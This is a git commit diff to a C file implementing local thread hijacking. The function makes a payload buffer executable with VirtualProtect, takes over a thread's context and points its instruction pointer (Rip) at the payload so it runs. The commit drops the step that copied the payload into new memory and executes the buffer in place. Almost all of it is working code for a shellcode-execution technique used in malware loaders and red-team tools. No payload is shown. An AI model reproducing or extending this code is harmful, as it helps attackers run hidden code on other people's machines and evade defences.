ef064ba9463ac4e209a64dff6a89a2872c4b6994
Marouane Benchiekh <marouanebenchiekh@gmail.com>
2024-10-08 09:32:01 -0700

    Thread Hijacking

--- ThreaHijacker/ThreaHijacker/LocalThreadHijacker.c
+++ ThreaHijacker/ThreaHijacker/LocalThreadHijacker.c
@@ -4,24 +4,13 @@
 int LocalThreadHijacking(HANDLE hThread, LPBYTE pPayload, SIZE_T szPayload) {
 
 	CONTEXT ThreadCtx = { 0 };
-	PVOID	pAddress = NULL;
 	DWORD	dwOldProtectoion = 0;
 	SIZE_T	NumberOfBytesWritten = 0;
 
 	ThreadCtx.ContextFlags = CONTEXT_CONTROL;
 
-	pAddress = VirtualAlloc(NULL, szPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (!pAddress) {
-		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
 
-	if (!WriteProcessMemory(GetCurrentProcess(), pAddress, pPayload, szPayload, &NumberOfBytesWritten)) {
-		printf("[!] WriteProcessMemory Failed With Error : %d \n NumberOfBytesWritten: %ld", GetLastError(), NumberOfBytesWritten);
-		return FALSE;
-	}
-
-	if (!VirtualProtect(pAddress, szPayload, PAGE_EXECUTE_READWRITE, &dwOldProtectoion)) {
+	if (!VirtualProtect(pPayload, szPayload, PAGE_EXECUTE_READWRITE, &dwOldProtectoion)) {
 		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -31,7 +20,7 @@ int LocalThreadHijacking(HANDLE hThread, LPBYTE pPayload, SIZE_T szPayload) {
 		return FALSE;
 	}
 
-	ThreadCtx.Rip = pAddress;
+	ThreadCtx.Rip = pPayload;
 
 	if (!SetThreadContext(hThread, &ThreadCtx)) {
 		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
